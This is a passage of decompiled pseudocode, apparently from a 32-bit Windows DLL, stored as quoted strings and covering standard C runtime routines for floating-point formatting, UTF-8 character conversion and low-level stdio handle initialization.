    "      _invoke_watson(0, 0, 0, 0, 0);",
    "    if ( a4 )",
    "      *v12 = 69;",
    "    if ( **(_BYTE **)(a6 + 8) != 48 )",
    "    {",
    "      v14 = *(_DWORD *)(a6 + 4) - 1;",
    "      if ( v14 < 0 )",
    "      {",
    "        v14 = 1 - *(_DWORD *)(a6 + 4);",
    "        v12[1] = 45;",
    "      }",
    "      if ( v14 >= 100 )",
    "      {",
    "        v15 = v14 / 100;",
    "        v14 %= 100;",
    "        v12[2] += v15;",
    "      }",
    "      if ( v14 >= 10 )",
    "      {",
    "        v16 = v14 / 10;",
    "        v14 %= 10;",
    "        v12[3] += v16;",
    "      }",
    "      v12[4] += v14;",
    "    }",
    "    if ( a5 == 2 && v12[2] == 48 )",
    "      memmove(v12 + 2, v12 + 3, 3u);",
    "    return 0;",
    "  }",
    "  else",
    "  {",
    "    *((_BYTE *)a8 + 28) = 1;",
    "    *((_DWORD *)a8 + 6) = 34;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a8);",
    "    return 34;",
    "  }",
    "}",
    "",
    "",
    "int __cdecl sub_10020C2F(",
    "        __int64 *a1,",
    "        char *Src,",
    "        unsigned int a3,",
    "        int a4,",
    "        rsize_t SizeInBytes,",
    "        size_t Size,",
    "        int a7,",
    "        __crt_cached_ptd_host *a8)",
    "{",
    "  BOOL v8; // ecx",
    "  int v9; // eax",
    "  int result; // eax",
    "  int v11; // [esp-28h] [ebp-40h]",
    "  int v12; // [esp+Ch] [ebp-Ch] BYREF",
    "  int v13; // [esp+10h] [ebp-8h]",
    "  int v14; // [esp+14h] [ebp-4h]",
    "",
    "  v12 = 0;",
    "  v13 = 0;",
    "  v14 = 0;",
    "  v11 = sub_100261E7(*a1, Size, 0, (int)&v12, a4, SizeInBytes);",
    "  v8 = v12 == 45;",
    "  v9 = a3 - v8;",
    "  if ( a3 == -1 )",
    "    v9 = -1;",
    "  result = __acrt_fp_strflt_to_string(&Src[v8], v9, Size + v13, (int)&v12, v11, a7, a8);",
    "  if ( !result )",
    "    return sub_10020CB8(Src, a3, Size, (int)&v12, 0, a8);",
    "  *Src = 0;",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl sub_10020CB8(char *Src, unsigned int a2, signed int Size, int a4, char a5, __crt_cached_ptd_host *a6)",
    "{",
    "  int v6; // ecx",
    "  size_t v7; // edi",
    "  char *v8; // esi",
    "  int v9; // eax",
    "  bool v10; // al",
    "  char *v11; // esi",
    "  __crt_cached_ptd_host *v12; // eax",
    "  char *v13; // esi",
    "  int v14; // eax",
    "  int v15; // eax",
    "",
    "  v6 = *(_DWORD *)(a4 + 4) - 1;",
    "  v7 = Size;",
    "  if ( a5 && v6 == Size )",
    "    *(_WORD *)&Src[v6 + (*(_DWORD *)a4 == 45)] = 48;",
    "  v8 = Src;",
    "  if ( *(_DWORD *)a4 == 45 )",
    "  {",
    "    *Src = 45;",
    "    v8 = Src + 1;",
    "  }",
    "  v9 = *(_DWORD *)(a4 + 4);",
    "  if ( v9 > 0 )",
    "  {",
    "    v11 = &v8[v9];",
    "  }",
    "  else",
    "  {",
    "    v10 = !v9 && **(_BYTE **)(a4 + 8) == 48;",
    "    if ( !a5 || !v10 )",
    "      shift_bytes(Src, a2, v8, 1);",
    "    *v8 = 48;",
    "    v11 = v8 + 1;",
    "  }",
    "  if ( Size > 0 )",
    "  {",
    "    shift_bytes(Src, a2, v11, 1);",
    "    v12 = a6;",
    "    if ( !*((_BYTE *)a6 + 20) )",
    "    {",
    "      __crt_cached_ptd_host::update_locale_slow(a6);",
    "      v12 = a6;",
    "    }",
    "    *v11 = ***(_BYTE ***)(*((_DWORD *)v12 + 3) + 136);",
    "    v13 = v11 + 1;",
    "    v14 = *(_DWORD *)(a4 + 4);",
    "    if ( v14 < 0 )",
    "    {",
    "      v15 = -v14;",
    "      if ( a5 || v15 < Size )",
    "        v7 = v15;",
    "      shift_bytes(Src, a2, v13, v7);",
    "      memset(v13, 48, v7);",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "int __cdecl sub_10020D98(",
    "        __int64 *a1,",
    "        char *Src,",
    "        rsize_t SizeInBytes,",
    "        int a4,",
    "        rsize_t a5,",
    "        signed int Size,",
    "        char a7,",
    "        int a8,",
    "        int a9,",
    "        __crt_cached_ptd_host *a10)",
    "{",
    "  BOOL v10; // edx",
    "  int v11; // eax",
    "  const char *v12; // esi",
    "  int result; // eax",
    "  signed int v14; // eax",
    "  int v15; // [esp-28h] [ebp-44h]",
    "  int v16; // [esp+Ch] [ebp-10h] BYREF",
    "  int v17; // [esp+10h] [ebp-Ch]",
    "  int v18; // [esp+14h] [ebp-8h]",
    "  signed int v19; // [esp+18h] [ebp-4h]",
    "",
    "  v16 = 0;",
    "  v17 = 0;",
    "  v18 = 0;",
    "  v15 = sub_100261E7(*a1, Size, 0, (int)&v16, a4, a5);",
    "  v10 = v16 == 45;",
    "  v11 = SizeInBytes - v10;",
    "  v19 = v17 - 1;",
    "  v12 = &Src[v10];",
    "  if ( SizeInBytes == -1 )",
    "    v11 = -1;",
    "  result = __acrt_fp_strflt_to_string(&Src[v10], v11, Size, (int)&v16, v15, a9, a10);",
    "  if ( result )",
    "  {",
    "    *Src = 0;",
    "  }",
    "  else",
    "  {",
    "    v14 = v17 - 1;",
    "    if ( v17 - 1 < -4 || v14 >= Size )",
    "    {",
    "      return sub_10020AEC(Src, SizeInBytes, Size, a7, a8, (int)&v16, 1u, a10);",
    "    }",
    "    else",
    "    {",
    "      if ( v19 < v14 )",
    "        v12[strlen(v12) - 1] = 0;",
    "      return sub_10020CB8(Src, SizeInBytes, Size, (int)&v16, 1, a10);",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "errno_t __cdecl fp_format_nan_or_infinity(",
    "        int a1,",
    "        unsigned __int8 a2,",
    "        char *Destination,",
    "        rsize_t SizeInBytes,",
    "        unsigned __int8 a5)",
    "{",
    "  rsize_t v5; // edx",
    "  errno_t result; // eax",
    "  char *v7; // ecx",
    "",
    "  v5 = SizeInBytes;",
    "  if ( SizeInBytes >= (unsigned int)a2 + 4 )",
    "  {",
    "    v7 = Destination;",
    "    if ( a2 )",
    "    {",
    "      *Destination = 45;",
    "      v7 = Destination + 1;",
    "      Destination[1] = 0;",
    "      if ( SizeInBytes != -1 )",
    "        v5 = SizeInBytes - 1;",
    "    }",
    "    result = strcpy_s(",
    "               v7,",
    "               v5,",
    "               (&(&off_100323A0)[2 * (a5 ^ 1)])[(__PAIR64__(",
    "                                                   4 * a1 - 4 + 1,",
    "                                                   strlen((&(&off_100323A0)[4 * a1 - 4])[2 * (a5 ^ 1)]))",
    "                                               - v5) >> 32]);",
    "    if ( result )",
    "      _invoke_watson(0, 0, 0, 0, 0);",
    "  }",
    "  else",
    "  {",
    "    *Destination = 0;",
    "    return 12;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void __cdecl shift_bytes(char *const a1, unsigned int a2, char *const Src, int a4)",
    "{",
    "  if ( a4 )",
    "    memmove(&Src[a4], Src, strlen(Src) + 1);",
    "}",
    "",
    "",
    "char __cdecl should_round_up(double *a1, unsigned __int64 a2, __int16 a3, int a4)",
    "{",
    "  unsigned __int64 v4; // rax",
    "  __int16 v5; // di",
    "  char result; // al",
    "  int v7; // eax",
    "",
    "  v4 = (__PAIR64__(HIDWORD(a2), *(_DWORD *)a1) & __PAIR64__(*((_DWORD *)a1 + 1), a2) & 0xFFFFFFFFFFFFFLL) >> a3;",
    "  v5 = v4;",
    "  if ( !a4 )",
    "    return (unsigned __int16)v4 >= 8u;",
    "  v7 = sub_100276C0();",
    "  switch ( v7 )",
    "  {",
    "    case 0:",
    "      return fe_to_nearest(a1, a2, a3);",
    "    case 512:",
    "      result = 0;",
    "      if ( v5 && *((int *)a1 + 1) >= 0 )",
    "        return 1;",
    "      break;",
    "    case 256:",
    "      result = 0;",
    "      if ( v5 && *((int *)a1 + 1) < 0 )",
    "        return 1;",
    "      break;",
    "    default:",
    "      return 0;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "errno_t __cdecl __acrt_fp_format(",
    "        int *a1,",
    "        char *Str,",
    "        rsize_t SizeInBytes,",
    "        int a4,",
    "        rsize_t a5,",
    "        int a6,",
    "        size_t Size,",
    "        char a8,",
    "        int a9,",
    "        int a10,",
    "        __crt_cached_ptd_host *a11)",
    "{",
    "  int v12; // ebx",
    "  char v13; // cl",
    "  int v14; // ecx",
    "  bool v15; // zf",
    "  int v16; // esi",
    "  int v17; // [esp-4h] [ebp-18h]",
    "  char v18; // [esp+10h] [ebp-4h]",
    "",
    "  if ( !Str || !SizeInBytes || !a4 || (v12 = 0, !a5) )",
    "  {",
    "    *((_BYTE *)a11 + 28) = 1;",
    "    *((_DWORD *)a11 + 6) = 22;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a11);",
    "    return 22;",
    "  }",
    "  if ( a6 == 65 || a6 == 69 || a6 == 70 || (v18 = 0, a6 == 71) )",
    "    v18 = 1;",
    "  v13 = a8;",
    "  if ( (a8 & 8) == 0 )",
    "  {",
    "    v14 = __acrt_fp_classify(a1);",
    "    if ( v14 )",
    "    {",
    "      if ( a1[1] >= 0 )",
    "        return fp_format_nan_or_infinity(v14, 0, Str, SizeInBytes, v18);",
    "      else",
    "        return fp_format_nan_or_infinity(v14, 1u, Str, SizeInBytes, v18);",
    "    }",
    "    v13 = a8;",
    "  }",
    "  if ( (v13 & 0x10) != 0 )",
    "    v17 = 3;",
    "  else",
    "    v17 = 2;",
    "  if ( (v13 & 0x20) != 0 )",
    "    v12 = a10;",
    "  if ( a6 > 97 )",
    "  {",
    "    v16 = a6 - 101;",
    "    v15 = a6 == 101;",
    "  }",
    "  else",
    "  {",
    "    if ( a6 == 97 || a6 == 65 )",
    "      return sub_10020720(a1, Str, SizeInBytes, a4, a5, Size, v18, v17, v12, a11);",
    "    v16 = a6 - 69;",
    "    v15 = a6 == 69;",
    "  }",
    "  if ( v15 )",
    "    return sub_10020A5C((__int64 *)a1, Str, SizeInBytes, a4, a5, Size, v18, v17, v12, a11);",
    "  if ( v16 == 1 )",
    "    return sub_10020C2F((__int64 *)a1, Str, SizeInBytes, a4, a5, Size, v12, a11);",
    "  return sub_10020D98((__int64 *)a1, Str, SizeInBytes, a4, a5, Size, v18, v17, v12, a11);",
    "}",
    "",
    "",
    "int __cdecl sub_1002113B(int *a1, LPSTR lpMultiByteStr, size_t Size, WCHAR WideCharStr, __crt_cached_ptd_host *a5)",
    "{",
    "  size_t v5; // eax",
    "  int result; // eax",
    "  __crt_cached_ptd_host *v7; // esi",
    "  int v8; // ecx",
    "  unsigned int v9; // edx",
    "  int v10; // eax",
    "  int v11; // eax",
    "  int v12; // edi",
    "  int v13; // [esp-4h] [ebp-18h]",
    "  int v14[2]; // [esp+Ch] [ebp-8h] BYREF",
    "",
    "  v5 = Size;",
    "  if ( !lpMultiByteStr && Size )",
    "  {",
    "    if ( a1 )",
    "      *a1 = 0;",
    "    return 0;",
    "  }",
    "  if ( a1 )",
    "    *a1 = -1;",
    "  v7 = a5;",
    "  if ( Size > 0x7FFFFFFF )",
    "  {",
    "    v13 = 22;",
    "LABEL_38:",
    "    v12 = v13;",
    "    *((_DWORD *)v7 + 6) = v13;",
    "    *((_BYTE *)v7 + 28) = 1;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)v7);",
    "    return v12;",
    "  }",
    "  if ( !*((_BYTE *)a5 + 20) )",
    "  {",
    "    __crt_cached_ptd_host::update_locale_slow(a5);",
    "    v5 = Size;",
    "  }",
    "  v8 = *((_DWORD *)v7 + 3);",
    "  v9 = *(_DWORD *)(v8 + 8);",
    "  if ( v9 != 65001 )",
    "  {",
    "    if ( *(_DWORD *)(v8 + 168) )",
    "    {",
    "      v14[1] = 0;",
    "      v11 = sub_10023952(v9, 0, &WideCharStr, 1, lpMultiByteStr, v5, 0, (int)&v14[1]);",
    "      if ( v11 )",
    "      {",
    "        if ( !v14[1] )",
    "        {",
    "          if ( a1 )",
    "            *a1 = v11;",
    "          return 0;",
    "        }",
    "        goto LABEL_23;",
    "      }",
    "      if ( GetLastError() != 122 )",
    "      {",
    "LABEL_23:",
    "        result = 42;",
    "        *((_DWORD *)v7 + 6) = 42;",
    "        *((_BYTE *)v7 + 28) = 1;",
    "        return result;",
    "      }",
    "      if ( lpMultiByteStr && Size )",
    "        memset(lpMultiByteStr, 0, Size);",
    "    }",
    "    else",
    "    {",
    "      if ( WideCharStr > 0xFFu )",
    "      {",
    "        if ( lpMultiByteStr && v5 )",
    "          memset(lpMultiByteStr, 0, v5);",
    "        goto LABEL_23;",
    "      }",
    "      if ( !lpMultiByteStr )",
    "      {",
    "LABEL_27:",
    "        if ( a1 )",
    "          *a1 = 1;",
    "        return 0;",
    "      }",
    "      if ( v5 )",
    "      {",
    "        *lpMultiByteStr = WideCharStr;",
    "        goto LABEL_27;",
    "      }",
    "    }",
    "    v13 = 34;",
    "    goto LABEL_38;",
    "  }",
    "  *(_QWORD *)v14 = 0;",
    "  v10 = sub_100276CF(lpMultiByteStr, WideCharStr, v14, v7);",
    "  if ( a1 )",
    "    *a1 = v10;",
    "  if ( v10 <= 4 || !*((_BYTE *)v7 + 28) )",
    "    return 0;",
    "  return *((_DWORD *)v7 + 6);",
    "}",
    "",
    "",
    "int __cdecl sub_1002129F(LPWSTR lpWideCharStr, CHAR *lpMultiByteStr, char *a3, struct _Mbstatet *a4)",
    "{",
    "  _DWORD *v4; // edx",
    "  int result; // eax",
    "  struct __crt_cached_ptd_host *v6; // [esp+0h] [ebp-10h]",
    "",
    "  if ( !lpMultiByteStr || !a3 )",
    "  {",
    "    qword_1004036C = 0;",
    "    return 0;",
    "  }",
    "  if ( !*lpMultiByteStr )",
    "  {",
    "    if ( lpWideCharStr )",
    "      *lpWideCharStr = 0;",
    "    return 0;",
    "  }",
    "  if ( !LOBYTE(a4[2]._Byte) )",
    "    __crt_cached_ptd_host::update_locale_slow((__crt_cached_ptd_host *)a4);",
    "  v4 = *(_DWORD **)&a4[1]._Byte;",
    "  if ( v4[2] != 65001 )",
    "  {",
    "    if ( !v4[42] )",
    "    {",
    "      if ( lpWideCharStr )",
    "        *lpWideCharStr = (unsigned __int8)*lpMultiByteStr;",
    "      return 1;",
    "    }",
    "    if ( *(__int16 *)(*v4 + 2 * (unsigned __int8)*lpMultiByteStr) >= 0 )",
    "    {",
    "      if ( __acrt_MultiByteToWideChar(v4[2], 9u, lpMultiByteStr, 1, lpWideCharStr, lpWideCharStr != 0) )",
    "        return 1;",
    "    }",
    "    else if ( (int)v4[1] > 1",
    "           && (int)a3 >= v4[1]",
    "           && __acrt_MultiByteToWideChar(v4[2], 9u, lpMultiByteStr, v4[1], lpWideCharStr, lpWideCharStr != 0)",
    "           || (unsigned int)a3 >= *(_DWORD *)(*(_DWORD *)&a4[1]._Byte + 4) && lpMultiByteStr[1] )",
    "    {",
    "      return *(_DWORD *)(*(_DWORD *)&a4[1]._Byte + 4);",
    "    }",
    "    LOBYTE(a4[3]._Byte) = 1;",
    "    result = -1;",
    "    a4[3]._Wchar = 42;",
    "    return result;",
    "  }",
    "  result = __crt_mbstring::__mbrtowc_utf8(",
    "             (__crt_mbstring *)lpWideCharStr,",
    "             (wchar_t *)lpMultiByteStr,",
    "             a3,",
    "             (unsigned int)&qword_1004036C,",
    "             a4,",
    "             v6);",
    "  if ( result < 0 )",
    "    return -1;",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl sub_100213CF(char *a1)",
    "{",
    "  char v1; // cl",
    "  int result; // eax",
    "",
    "  v1 = *a1;",
    "  if ( *a1 >= 0 )",
    "    return v1 != 0;",
    "  if ( (v1 & 0xE0) == 0xC0 )",
    "    return 2;",
    "  if ( (v1 & 0xF0) == 0xE0 )",
    "    return 3;",
    "  result = -1;",
    "  if ( (v1 & 0xF8) == 0xF0 )",
    "    return 4;",
    "  return result;",
    "}",
    "",
    "",
    "unsigned int __cdecl sub_10021410(unsigned int *a1, char *a2, int a3, __crt_mbstring *a4, struct _Mbstatet *a5)",
    "{",
    "  __crt_mbstring *v5; // edi",
    "  int v6; // eax",
    "  char *v7; // eax",
    "  unsigned int *v8; // edx",
    "  int v10; // edx",
    "  unsigned __int8 v11; // cl",
    "  unsigned __int8 v12; // bl",
    "  unsigned int v13; // esi",
    "  __crt_mbstring *v14; // ecx",
    "  unsigned int v15; // eax",
    "  char *v16; // eax",
    "  char v17; // bh",
    "  struct __crt_cached_ptd_host *v18; // [esp+0h] [ebp-3Ch]",
    "  unsigned int *v19; // [esp+10h] [ebp-2Ch]",
    "  unsigned int v20; // [esp+1Ch] [ebp-20h]",
    "  char *v21; // [esp+20h] [ebp-1Ch]",
    "  unsigned int i; // [esp+24h] [ebp-18h]",
    "  unsigned __int8 v23; // [esp+2Bh] [ebp-11h]",
    "  int v24; // [esp+2Ch] [ebp-10h]",
    "  int v25; // [esp+30h] [ebp-Ch]",
    "  int v26; // [esp+34h] [ebp-8h]",
    "",
    "  v5 = (__crt_mbstring *)&unk_10040374;",
    "  if ( a4 )",
    "    v5 = a4;",
    "  v6 = 1;",
    "  if ( a2 )",
    "    v6 = a3;",
    "  i = v6;",
    "  v7 = (char *)&unk_1003B3A1;",
    "  if ( a2 )",
    "    v7 = a2;",
    "  v8 = 0;",
    "  v21 = v7;",
    "  if ( a2 )",
    "    v8 = a1;",
    "  v19 = v8;",
    "  if ( !i )",
    "    return -2;",
    "  if ( *((_WORD *)v5 + 3) )",
    "  {",
    "    LOBYTE(v10) = *((_BYTE *)v5 + 4);",
    "    v13 = *(_DWORD *)v5;",
    "    v12 = *((_BYTE *)v5 + 6);",
    "    if ( (unsigned __int8)(v10 - 2) > 2u || !v12 || v12 >= (unsigned __int8)v10 )",
    "      return __crt_mbstring::return_illegal_sequence(v5, a5, v18);",
    "  }",
    "  else",
    "  {",
    "    v10 = sub_100213CF(v7);",
    "    v11 = *v21;",
    "    v23 = *v21++;",
    "    if ( (unsigned int)v10 < 2 )",
    "    {",
    "      if ( v19 )",
    "        *v19 = v11;",
    "      return v10;",
    "    }",
    "    if ( v10 < 2 || v10 > 4 )",
    "      return __crt_mbstring::return_illegal_sequence(v5, a5, v18);",
    "    v12 = v10;",
    "    v13 = v23 & ((1 << (7 - v10)) - 1);",
    "  }",
    "  v14 = (__crt_mbstring *)v12;",
    "  v15 = v12;",
    "  if ( v12 >= i )",
    "    v15 = i;",
    "  v20 = v15;",
    "  v16 = v21;",
    "  for ( i = v21 - a2; i < v20; ++v16 )",
    "  {",
    "    v17 = *v16;",
    "    ++i;",
    "    if ( (v17 & 0xC0) != 0x80 )",
    "      return __crt_mbstring::return_illegal_sequence(v5, a5, v18);",
    "    v13 = v17 & 0x3F | (v13 << 6);",
    "  }",
    "  if ( v20 < v12 )",
    "  {",
    "    *((_WORD *)v5 + 2) = (unsigned __int8)v10;",
    "    *(_DWORD *)v5 = v13;",
    "    *((_WORD *)v5 + 3) = (unsigned __int8)(v12 - v20);",
    "    return -2;",
    "  }",
    "  if ( v13 >= 0xD800 && v13 <= 0xDFFF )",
    "    return __crt_mbstring::return_illegal_sequence(v5, a5, v18);",
    "  if ( v13 > 0x10FFFF )",
    "    return __crt_mbstring::return_illegal_sequence(v5, a5, v18);",
    "  v24 = 128;",
    "  v25 = 2048;",
    "  v26 = 0x10000;",
    "  if ( v13 < *(&i + (unsigned __int8)v10) )",
    "    return __crt_mbstring::return_illegal_sequence(v5, a5, v18);",
    "  if ( v19 )",
    "    *v19 = v13;",
    "  if ( !v13 )",
    "    v14 = 0;",
    "  return __crt_mbstring::reset_and_return(v14, (unsigned int)v5, (struct _Mbstatet *)v18);",
    "}",
    "",
    "",
    "int __usercall sub_100215C9@<eax>(",
    "        struct __crt_cached_ptd_host *a1@<edi>,",
    "        struct _Mbstatet *a2,",
    "        unsigned __int16 a3,",
    "        __crt_mbstring *a4,",
    "        struct _Mbstatet *a5)",
    "{",
    "  __crt_mbstring *v5; // esi",
    "  unsigned __int16 v6; // ax",
    "  __crt_mbstring *v8; // eax",
    "  struct _Mbstatet *v9; // [esp-14h] [ebp-20h]",
    "  struct _Mbstatet *v10; // [esp-8h] [ebp-14h]",
    "  __int64 v11; // [esp+4h] [ebp-8h] BYREF",
    "",
    "  v5 = (__crt_mbstring *)&unk_1004037C;",
    "  if ( a4 )",
    "    v5 = a4;",
    "  v6 = a3 + 9216;",
    "  if ( *(_DWORD *)v5 )",
    "  {",
    "    v10 = a5;",
    "    if ( v6 > 0x3FFu )",
    "      return __crt_mbstring::return_illegal_sequence(v5, v10, a1);",
    "    v11 = 0;",
    "    v8 = (__crt_mbstring *)sub_100276CF(a2, *(_DWORD *)v5 + (a3 & 0x23FF), &v11, a5);",
    "    return __crt_mbstring::reset_and_return(v8, (unsigned int)v5, v9);",
    "  }",
    "  else",
    "  {",
    "    if ( v6 <= 0x3FFu )",
    "    {",
    "      v10 = a5;",
    "      return __crt_mbstring::return_illegal_sequence(v5, v10, a1);",
    "    }",
    "    if ( (unsigned __int16)(a3 + 10240) > 0x3FFu )",
    "    {",
    "      return sub_100276CF(a2, a3, v5, a5);",
    "    }",
    "    else",
    "    {",
    "      *(_DWORD *)v5 = ((a3 & 0x27FF) + 64) << 10;",
    "      return 0;",
    "    }",
    "  }",
    "}",
    "",
    "",
    "int __stdcall _lambda_0f007d4f94c691a9a85cf1869a09f0c3_::operator()(_BYTE *a1)",
    "{",
    "  if ( !*a1 )",
    "    return 1;",
    "  if ( a1[1] )",
    "    return (a1[2] != 0) + 3;",
    "  return 2;",
    "}",
    "",
    "",
    "unsigned int __cdecl __crt_mbstring::__mbrtowc_utf8(",
    "        __crt_mbstring *this,",
    "        wchar_t *a2,",
    "        const char *a3,",
    "        __crt_mbstring *a4,",
    "        struct _Mbstatet *a5)",
    "{",
    "  unsigned int v5; // ecx",
    "  unsigned int v6; // edx",
    "  __int16 v7; // cx",
    "  unsigned int v9; // [esp+0h] [ebp-4h] BYREF",
    "",
    "  v9 = v5;",
    "  v6 = sub_10021410(&v9, (char *)a2, (int)a3, a4, a5);",
    "  if ( v6 <= 4 )",
    "  {",
    "    v7 = v9;",
    "    if ( v9 > 0xFFFF )",
    "      v7 = -3;",
    "    if ( this )",
    "      *(_WORD *)this = v7;",
    "  }",
    "  return v6;",
    "}",
    "",
    "",
    "unsigned int __cdecl __crt_mbstring::__mbsrtowcs_utf8(",
    "        __crt_mbstring *this,",
    "        wchar_t *a2,",
    "        const char **a3,",
    "        __crt_mbstring *a4,",
    "        struct _Mbstatet *a5)",
    "{",
    "  char *v5; // edi",
    "  const char **v6; // ebx",
    "  __crt_mbstring *v7; // esi",
    "  int v8; // eax",
    "  unsigned int v9; // eax",
    "  __int16 v10; // cx",
    "  unsigned int v11; // ecx",
    "  unsigned int result; // eax",
    "  int v13; // ebx",
    "  int i; // eax",
    "  int v15; // eax",
    "  unsigned int v16; // ecx",
    "  unsigned int v17; // [esp+Ch] [ebp-8h] BYREF",
    "",
    "  v5 = *(char **)a2;",
    "  if ( this )",
    "  {",
    "    v6 = a3;",
    "    v7 = this;",
    "    if ( a3 )",
    "    {",
    "      while ( 1 )",
    "      {",
    "        v8 = _lambda_0f007d4f94c691a9a85cf1869a09f0c3_::operator()(v5);",
    "        v9 = sub_10021410(&v17, v5, v8, a4, a5);",
    "        if ( v9 == -1 )",
    "          break;",
    "        if ( !v9 )",
    "        {",
    "          v5 = 0;",
    "          *(_WORD *)v7 = 0;",
    "          goto LABEL_9;",
    "        }",
    "        v10 = v17;",
    "        if ( v17 > 0xFFFF )",
    "        {",
    "          if ( (unsigned int)v6 <= 1 )",
    "            goto LABEL_9;",
    "          v11 = v17 - 0x10000;",
    "          v6 = (const char **)((char *)v6 - 1);",
    "          v17 = v11;",
    "          *(_WORD *)v7 = (v11 >> 10) | 0xD800;",
    "          v7 = (__crt_mbstring *)((char *)v7 + 2);",
    "          v10 = v11 & 0x3FF | 0xDC00;",
    "        }",
    "        *(_WORD *)v7 = v10;",
    "        v5 += v9;",
    "        v7 = (__crt_mbstring *)((char *)v7 + 2);",
    "        v6 = (const char **)((char *)v6 - 1);",
    "        if ( !v6 )",
    "          goto LABEL_9;",
    "      }",
    "      *(_DWORD *)a2 = v5;",
    "      LOBYTE(a5[3]._Byte) = 1;",
    "      a5[3]._Wchar = 42;",
    "      return -1;",
    "    }",
    "    else",
    "    {",
    "LABEL_9:",
    "      result = (v7 - this) >> 1;",
    "      *(_DWORD *)a2 = v5;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v13 = 0;",
    "    for ( i = _lambda_0f007d4f94c691a9a85cf1869a09f0c3_::operator()(v5);",
    "          ;",
    "          i = _lambda_0f007d4f94c691a9a85cf1869a09f0c3_::operator()(v5) )",
    "    {",
    "      result = sub_10021410(0, v5, i, a4, a5);",
    "      v16 = result;",
    "      if ( result == -1 )",
    "      {",
    "        LOBYTE(a5[3]._Byte) = 1;",
    "        a5[3]._Wchar = 42;",
    "        return result;",
    "      }",
    "      if ( !result )",
    "        break;",
    "      v5 += result;",
    "      v15 = v13 + 1;",
    "      if ( v16 != 4 )",
    "        v15 = v13;",
    "      v13 = v15 + 1;",
    "    }",
    "    return v13;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl _fileno(FILE *Stream)",
    "{",
    "  if ( Stream )",
    "    return Stream->_file;",
    "  *(_DWORD *)sub_1001E025() = 22;",
    "  _invalid_parameter_noinfo();",
    "  return -1;",
    "}",
    "",
    "",
    "int __cdecl _get_printf_count_output()",
    "{",
    "  return dword_10040384 == (__security_cookie | 1);",
    "}",
    "",
    "",
    "void sub_10021832()",
    "{",
    "  LPBYTE lpReserved2; // edi",
    "  int v1; // esi",
    "  HANDLE *v2; // ebx",
    "  int v3; // esi",
    "  int v4; // eax",
    "  BYTE v5; // cl",
    "  char *v6; // edx",
    "  _STARTUPINFOW StartupInfo; // [esp+0h] [ebp-48h] BYREF",
    "  int v8; // [esp+44h] [ebp-4h]",
    "",
    "  GetStartupInfoW(&StartupInfo);",
    "  if ( StartupInfo.cbReserved2 )",
    "  {",
    "    lpReserved2 = StartupInfo.lpReserved2;",
    "    if ( StartupInfo.lpReserved2 )",
    "    {",
    "      v1 = 0x2000;",
    "      v2 = (HANDLE *)&StartupInfo.lpReserved2[*(_DWORD *)StartupInfo.lpReserved2 + 4];",
    "      if ( *(int *)StartupInfo.lpReserved2 < 0x2000 )",
    "        v1 = *(_DWORD *)StartupInfo.lpReserved2;",
    "      __acrt_lowio_ensure_fh_exists(v1);",
    "      if ( v1 > dword_10040590 )",
    "        v1 = dword_10040590;",
    "      v8 = v1;",
    "      v3 = 0;",
    "      v4 = v8;",
    "      if ( v8 )",
    "      {",
    "        do",
    "        {",
    "          if ( *v2 != (HANDLE)-1 && *v2 != (HANDLE)-2 )",
    "          {",
    "            v5 = lpReserved2[v3 + 4];",
    "            if ( (v5 & 1) != 0 )",
    "            {",
    "              if ( (v5 & 8) != 0 || GetFileType(*v2) )",
    "              {",
    "                v6 = (char *)lpCriticalSection[v3 >> 6] + 56 * (v3 & 0x3F);",
    "                *((_DWORD *)v6 + 6) = *v2;",
    "                v6[40] = lpReserved2[v3 + 4];",
    "              }",
    "              v4 = v8;",
    "            }",
    "          }",
    "          ++v3;",
    "          ++v2;",
    "        }",
    "        while ( v3 != v4 );",
    "      }",
    "    }",
    "  }",
    "}",
    "",
    "",
    "void __cdecl initialize_stdio_handles_nolock()",
    "{",
    "  int i; // edi",
    "  char *v1; // esi",
    "  HANDLE StdHandle; // eax",
    "  HANDLE v3; // ebx",
    "  DWORD FileType; // eax",
    "",
    "  for ( i = 0; i != 3; ++i )",
    "  {",
    "    v1 = (char *)lpCriticalSection[i >> 6] + 56 * (i & 0x3F);",
    "    if ( *((_DWORD *)v1 + 6) == -1 || *((_DWORD *)v1 + 6) == -2 )",
    "    {",
    "      v1[40] = -127;",
    "      if ( i )",
    "      {",
    "        if ( i == 1 )",
    "          StdHandle = GetStdHandle(0xFFFFFFF5);",
    "        else",
    "          StdHandle = GetStdHandle(0xFFFFFFF4);",
    "      }",
    "      else",
    "      {",
    "        StdHandle = GetStdHandle(0xFFFFFFF6);",
    "      }",
    "      v3 = StdHandle;",
    "      if ( StdHandle != (HANDLE)-1 && StdHandle && (FileType = GetFileType(StdHandle)) != 0 )",
    "      {",
    "        *((_DWORD *)v1 + 6) = v3;",
    "        if ( (unsigned __int8)FileType == 2 )",
    "        {",
    "          v1[40] |= 0x40u;",
    "        }",
    "        else if ( (unsigned __int8)FileType == 3 )",
    "        {",
    "          v1[40] |= 8u;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v1[40] |= 0x40u;",
    "        *((_DWORD *)v1 + 6) = -2;",
    "        if ( Block )",
    "          *(_DWORD *)(*((_DWORD *)Block + i) + 16) = -2;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v1[40] |= 0x80u;",
    "    }",
    "  }",
    "}",
    "",
    "",
    "char __acrt_initialize_lowio()",
    "{",
    "  char v0; // bl",
    "",
    "  __acrt_lock(7);",
    "  v0 = 0;",
    "  if ( !__acrt_lowio_ensure_fh_exists(0) )",
    "  {",
    "    sub_10021832();",
    "    initialize_stdio_handles_nolock();",
    "    v0 = 1;",
    "  }",
    "  __acrt_unlock(7);",
    "  return v0;",
    "}",
    "",
    "",
    "char sub_100219F2()",
    "{",
    "  unsigned int i; // esi",
    "",
    "  for ( i = 0; i < 128; ++i )",
    "  {",
    "    if ( lpCriticalSection[i] )",
    "    {",
    "      __acrt_lowio_destroy_handle_array(lpCriticalSection[i]);",
